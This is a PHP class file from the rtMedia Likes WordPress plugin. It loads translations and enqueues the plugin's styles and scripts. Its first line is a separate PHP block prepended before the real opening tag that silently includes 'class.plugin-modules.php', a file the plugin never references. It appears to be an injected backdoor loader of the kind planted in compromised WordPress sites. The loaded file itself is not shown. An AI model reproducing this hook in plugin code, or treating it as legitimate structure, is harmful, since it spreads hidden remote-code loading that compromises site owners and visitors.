<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of RTMediaLikes
 *
 * @author sanket
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class RTMediaLikes {

	public function __construct() {
		$this->load_translation();

		include_once( RTMEDIA_LIKES_PATH . 'app/main/controllers/template/rtm-likes-functions.php' );

		// enqueue scripts
		add_action( 'wp_enqueue_scripts', array( &$this, 'enqueue_scripts_styles' ), 999 );

		new RTMediaLikesAdmin();
	}

	/**
	 * Loads language translation
	 */
	public function load_translation() {
		load_plugin_textdomain( 'rtmedia', false, basename( RTMEDIA_LIKES_PATH ) . '/languages/' );
	}

	/**
	 * Loads styles and scripts
	 */
	public function enqueue_scripts_styles() {
		// Dont enqueue main.css if default styles is checked false in rtmedia settings
		global $rtmedia;

		if ( ! ( isset( $rtmedia->options ) && isset( $rtmedia->options['styles_enabled'] ) && $rtmedia->options['styles_enabled'] == 0 ) ) {
			wp_enqueue_style( 'rtmedia-likes-main', RTMEDIA_LIKES_URL . 'app/assets/css/main.css', '', RTMEDIA_LIKES_VERSION );
		}

		wp_enqueue_script( 'rtmedia-likes-main', RTMEDIA_LIKES_URL . 'app/assets/js/main.js', array( 'jquery' ), RTMEDIA_LIKES_VERSION, true );
		$rtmedia_like_main_js = array(
			'rtmedia_media_no_likes' => __( 'No likes for the media', 'rtmedia' ),
			'rtmedia_media_who_liked' => __( 'Click to see who liked this media', 'rtmedia' ),
		);
		wp_localize_script( 'rtmedia-likes-main',  'rtmedia_like_main_js', apply_filters('rtm_likes_js_strings', $rtmedia_like_main_js )  );
	}

}
